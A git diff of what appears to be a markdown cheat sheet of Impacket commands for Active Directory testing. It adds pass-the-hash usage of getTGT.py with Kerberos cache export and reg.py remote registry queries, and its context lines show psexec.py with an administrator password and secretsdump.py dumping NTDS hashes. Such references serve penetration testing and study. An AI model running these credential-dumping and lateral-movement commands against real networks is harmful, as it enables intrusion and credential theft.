@@ -203,10 +203,21 @@ psexec.py punipunidenki.local/administrator:'f!wef23424;'@192.168.9.100 "-e cmd.
 secretsdump.py -ntds /tmp/ntds.dit -system /tmp/SYSTEM local -outputfile /tmp/ADHashes.txt
 ```
 
-[getTGT.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py):get a Kerberos ticket and use it to access other services
+[getTGT.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/getTGT.py): get a Kerberos ticket and use it to access other services
 
 ```shell
-getTGT.py -hashes <lm:nt> <domain>/<user>
+getTGT.py -hashes 'LM:NT' <domain>/<user>
+# Kerberos credentials cache
+export KRB5CCNAME=<username>@<domain>.ccache
+# showing Kerberos credentials cache
+klist
+```
+
+[reg.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/reg.py): remote registry manipulation tool through the ```MS-RRP``` [(Windows Remote Registry Protocol)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rrp/0fa3191d-bb79-490a-81bd-54c2601b7a78)
+
+```shell
+reg.py <domain>/<valid username with domain> -hashes 'LM:NT' query -keyName <Registry Root Keys>
+# Registry Root Keys: HKCR, HKCU, HKLM, HKU, HKCC
 ```
 
 ### :open_file_folder: Test Environment
